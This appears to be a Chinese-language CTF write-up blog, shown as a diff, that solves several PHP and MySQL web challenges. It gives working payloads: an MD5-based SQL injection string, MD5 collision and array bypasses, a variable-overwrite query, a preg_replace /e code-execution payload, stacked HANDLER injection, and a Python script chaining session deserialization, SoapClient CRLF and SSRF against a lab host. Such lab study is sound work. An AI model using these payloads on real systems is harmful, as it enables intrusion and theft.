+<p>password为 <code>ffifdyop</code> 的时候即可, 因为 <code>ffifdyop</code> 的md5值的原始二进制数存在 ‘or’6 </p>
+<p>在mysql里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 </p>
+<p><code>window.location.replace(&#39;./levels91.php&#39;)</code> 继续访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>弱类型绕过,用数组也行<code>levels91.php?a[]=1&amp;b[]=2</code> md5不能处理数组,都为null就true了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag; <span class="comment">// 这和安洵杯的 easy_web一样了, md5 强比较,直接来</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><ul>
+<li>源码泄露</li>
+<li>变量覆盖</li>
+</ul>
+<p>一个博客页面,唯一功能就是留言板,先扫一下目录,发现了<code>.git/config</code> 等,于是知道是源码泄露, 然后用GitHack下载源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $x =&gt; $y) &#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $x =&gt; $y) &#123; <span class="comment">// $x = &#x27;yds&#x27; $y = &#x27;flag&#x27;</span></span><br><span class="line">    $$x = $$y; <span class="comment">// $$x 就是 $yds, $$y就是 $flag, 最后就覆盖成为 $yds = $flag;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $x =&gt; $y) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds); <span class="comment">// exit($yds) 就覆盖为 exit($flag); 输出flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span> . $flag;</span><br></pre></td></tr></table></figure>
+
+<p>因为是变量覆盖嘛.所以要得到flag, 就<strong>必须让 handsome , yds 或者is 的值为$flag</strong>,这样就相当于exit($flag);</p>
+<p>最简单的方法就是,不传flag,让下面这段代码 执行 exit</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br></pre></td></tr></table></figure>
+
+<p> <code>/?yds=flag</code> 即可</p>
+<p>可变变量: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>前面的内容和ZJCTF的逆转思维那道题差不多,<code>?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php</code> 并且POST 内容为I have a dream , 读到next.php 的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) // 定义一个函数,用于正则匹配</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>, <span class="comment">// 注意这里是 /e 模式,可以进行代码执行</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str <span class="comment">//  匹配str中符合模式的</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用数组遍历 把变量名传递给re,变量值传递给str</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 然后输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里 <code>preg_replace()</code> 用了 /e 模式,<strong>可以把匹配来的字符串当作正则表达式执行</strong>,即<code>strtolower(&quot;\\1&quot;)</code> 这部分</p>
+<p><code>\\1 实际上就是 \1</code> (第一个是用来转义滴) ，而 \1 在正则表达式中有自己的含义。我们来看看 W3Cschool 中对其的描述：</p>
+<blockquote>
+<p>反向引用</p>
+<p>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区  中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99  个捕获的子表达式。<strong>每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</strong>。</p>
+</blockquote>
+<p>所以这里的 \1 实际上指定的是第一个子匹配项</p>
+<p>然后<strong>在PHP中,对于传入的非法的$_GET 数组参数名,会将其转换为下划线,导致正则匹配失效</strong></p>
+<p>payload: <code>\S*=$&#123;phpinfo()&#125;</code> </p>
+<p>然后用这个写一句话, 蚁剑连,拿flag. 学习知识参考资料二,写的比我好,不多说了 😄</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36340642/article/details/79352876">https://blog.csdn.net/qq_36340642/article/details/79352876</a>  关于正则表达式的修饰符</p>
+<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/145649.htm">深入研究php中的preg_replace()/e模式下的命令执行</a></p>
+<h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><ul>
+<li>堆叠注入</li>
+</ul>
+<p>强网杯改变过来的</p>
+<p><code>1&#39;;show databases;</code> </p>
+<p><code>1&#39;;show tables from supersqli;</code>  得到表为 FlagHere 和 words</p>
+<p><code>1&#39;;show columns from FlagHere;</code> 得到字段为 flag 但是长度只有 8位, 所以应该不是这个,转回去看 words表</p>
+<p>字段有 id data</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>这里正则 增加了 alter 和 rename </p>
+<p>这里用预编译的方式来做做不出来, 可能上次用的是strstr()函数是不区分大小写的,这次可能用的是stristr(),区分大小写了, 所以通过预编译和改表名的方法都做不出来了.</p>
+<p>看了大佬的WP, 才发现还有第三种方法, 利用MYSQL 的新特性<code>handler</code> </p>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> MYSQL 文档</p>
+<p><a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/handler.html">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/handler.html</a> 中文的 哈哈哈</p>
+<p><code>HANDLER ... OPEN</code>语句打开 table，使用后续的<code>HANDLER ... READ</code> statements 可以访问它;此 table object 不会被其他会话共享，并且在 session calls <code>HANDLER ... CLOSE</code>或 session 终止之前不会关闭。</p>
+<p><code>HANDLER ... CLOSE</code>关闭用<code>HANDLER ... OPEN</code>打开的 table。</p>
+<blockquote>
+<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
+</blockquote>
+<p>因此可以用这种方法来写payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">HANDLER</span> FlagHere <span class="keyword">OPEN</span>;</span><br><span class="line"><span class="keyword">HANDLER</span> FlagHere <span class="keyword">READ</span> <span class="keyword">FIRST</span>;</span><br><span class="line"><span class="keyword">HANDLER</span> FlagHere <span class="keyword">CLOSE</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>tttttql…. 不知道就不知道怎么做(其实说明了一点,不管是渗透还是CTF,信息搜集永远都是第一位), CTF For Learn!</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JesseYoung/article/details/40785137">https://blog.csdn.net/JesseYoung/article/details/40785137</a> ( 这篇文章是2014年就)</p>
+<h1 id="LCTF-2018-bestphp’s-revenge"><a href="#LCTF-2018-bestphp’s-revenge" class="headerlink" title="[LCTF 2018]bestphp’s revenge"></a>[LCTF 2018]bestphp’s revenge</h1><ul>
+<li>序列化注入攻击</li>
+<li>PHP session 引擎机制不同导致的序列化漏洞</li>
+<li>原题是有hint的, hint: 反序列化</li>
+<li>session 反序列化 &gt; SoapClient 执行不存在的方法调用了__call  导致ssrf &gt; 变量覆盖b为call_user_func 获得cookie</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST); <span class="comment">// 回调函数,新的函数名由GET 的参数决定, 函数内容由 POST 的参数决定</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 通过GET 到的name来设置session</span></span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION); <span class="comment">// 输出session 的类型和值</span></span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>); <span class="comment">// reset — 将数组的内部指针指向第一个单元</span></span><br><span class="line">call_user_func($b, $a); <span class="comment">// implode($a); implode() 函数,将一维数组转化为字符串,但是这样肯定就浪费了</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到题一在想这个<code>call_user_func()</code> 是不是可以用来写个后调后门, 看了Smi1e 师傅的文章才发现还有一个flag.php , 然后我就去扫了下目录, 果然存在…. 以后做题第二件事就是扫目录 - . -</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line">$flag = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>] === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    $_SESSION[<span class="string">&#x27;flag&#x27;</span>] = $flag;</span><br><span class="line">&#125; </span><br><span class="line">only localhost can get flag!  <span class="comment">// SSRF</span></span><br></pre></td></tr></table></figure>
+
+<p>首先需要明确思路,要达到本地,即唯一通过SSRF 去访问 flag.php 通过变量覆盖获得session中的flag</p>
+<p>关键点是如何将session 序列化引擎覆盖?</p>
+<p><strong>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可</strong>  — 参考资料2</p>
+<h2 id="PHP-中的session-反序列化机制"><a href="#PHP-中的session-反序列化机制" class="headerlink" title="PHP 中的session 反序列化机制"></a>PHP 中的session 反序列化机制</h2><h3 id="session的存储机制"><a href="#session的存储机制" class="headerlink" title="session的存储机制"></a>session的存储机制</h3><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<strong>session.save_handler</strong>来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的</p>
+<p>有三种方式</p>
+<ul>
+<li>默认使用php : 格式 <code>键名|键值(经过序列化函数处理的值)</code></li>
+<li>php_serialize: 格式 经过序列化函数处理的值</li>
+<li>php_binary: 键名的长度对应的ASCII字符 + 键名 + 经过序列化函数处理的值</li>
+</ul>
+<p>在<code>php.ini</code> 中有三项配置: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;&quot;   --设置session的存储路径</span><br><span class="line">session.save_handler&#x3D;&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler   string --定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>
+
+<p>我的phpstudy_pro的 session 文件存放在extension/tmp/tmp目录</p>
+<p>第一种(默认php): </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1FonlY&#x27;</span> ;</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// array(1) &#123; [&quot;name&quot;]=&gt; string(6) &quot;1FonlY&quot; &#125; </span></span><br></pre></td></tr></table></figure>
+
+<p>查看session 文件 : <code>name|s:6:&quot;1FonlY&quot;;</code> </p>
+<p>第二种: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,  <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1FonlY&#x27;</span> ;</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// array(1) &#123; [&quot;name&quot;]=&gt; string(6) &quot;1FonlY&quot; &#125; </span></span><br></pre></td></tr></table></figure>
+
+<p><code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;1FonlY&quot;;&#125;</code> <code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
+<p>第三种: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,  <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1FonlY&#x27;</span> ;</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>names:6:&quot;1FonlY&quot;;</code>  不可显的为<code>EOT</code>  ,<code>name</code>的长度为<code>4</code> 4在ASCII 表中就是 EOT</p>
+<h3 id="session-序列化注入漏洞"><a href="#session-序列化注入漏洞" class="headerlink" title="session 序列化注入漏洞"></a>session 序列化注入漏洞</h3><blockquote>
+<p><strong>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞</strong></p>
+</blockquote>
+<p>比如这里先实例化一个对象,然后将其序列化为 <code>O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code></p>
+<p>如果传入 <code>|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code> 在使用<code>php_serialize</code> 引擎的时候</p>
+<p>序列化后的session 文件是这样的 <code>a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;&quot;;&#125;</code></p>
+<p>这时,将<code>a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;</code> 当做键名, <code>O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code> 当做键值,将键值进行反序列化输出,这时就造成了序列化注入攻击</p>
+<h2 id="可以SSRF-的类SoapClient"><a href="#可以SSRF-的类SoapClient" class="headerlink" title="可以SSRF 的类SoapClient"></a>可以SSRF 的类SoapClient</h2><p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">l3m0n 师傅的反序列化之PHP原生类的利用</a>中讲到 SoapClient 类搭配CRLF注入可以实现SSRF, 在本地生成payload的时候,需要修改<code>php.ini</code> 中的 <code>;extension soap</code>  将注释删掉即可</p>
+<p>因为SoapClient 类会调用 <code>__call</code> 方法,当执行一个不存在的方法时,被调用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301162345.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301163043.png"></p>
+<p>构造序列化覆盖 序列化引擎,并将soap类写入session文件, <code>session_start</code> 会**<code>自动进行反序列化</code>**</p>
+<p>触发<code>__call</code> 即当soapclient <strong>对象去调用一个不可访问的方法时</strong></p>
+<p>SoapClient  的UA 可进行 CRLF注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301164726.png"></p>
+<p>这里<code>reset</code> 将数组内部指针指向第一个单元,也就是SoapClient, 从上面可以看出,如果把$b覆盖为<code>call_user_func</code>即可 实现<code>__call</code> 的触发(call_user_func 可以执行对象中的方法)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; $url, <span class="string">&#x27;location&#x27;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span>。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301132734.png"></p>
+<p>然后的步骤就是,<code>?f=extract&amp;name=SoapClient</code> , POST 过去 <code>b=call_user_func</code> 覆盖变量b,利用<code>call_user_func</code>调用SoapClient类中不存在的方法,就会触发<code>__call</code>方法.执行ssrf.并获得访问flag.php的cookie, 然后用这个cookie访问一下就行了</p>
+<p>Python版本: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Eustiar</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://c85b635f-1224-4de2-9b64-de9a2adc0d99.node3.buuoj.cn/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;|O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">data = &#123;<span class="string">&#x27;serialize_handler&#x27;</span>: <span class="string">&#x27;php_serialize&#x27;</span>&#125;</span><br><span class="line">res = r.post(url=url+<span class="string">&#x27;?f=session_start&amp;name=&#x27;</span>+payload, data=data)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">res = r.get(url)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">data = &#123;<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;call_user_func&#x27;</span>&#125;</span><br><span class="line">res = r.post(url=url+<span class="string">&#x27;?f=extract&#x27;</span>, data=data)</span><br><span class="line">res = r.post(url=url+<span class="string">&#x27;?f=extract&#x27;</span>, data=data)  <span class="comment"># 相当于刷新页面</span></span><br><span class="line">sessionid = re.findall(<span class="string">r&#x27;string\(26\) &quot;(.*?)&quot;&#x27;</span>, res.text)</span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=&quot;</span> + sessionid[<span class="number">0</span>]&#125;</span><br><span class="line">res = r.get(url, headers=cookie)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料:"></a>参考资料:</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">L3m0n</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">Smi1e</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP 中的session反序列化机制</a></p>
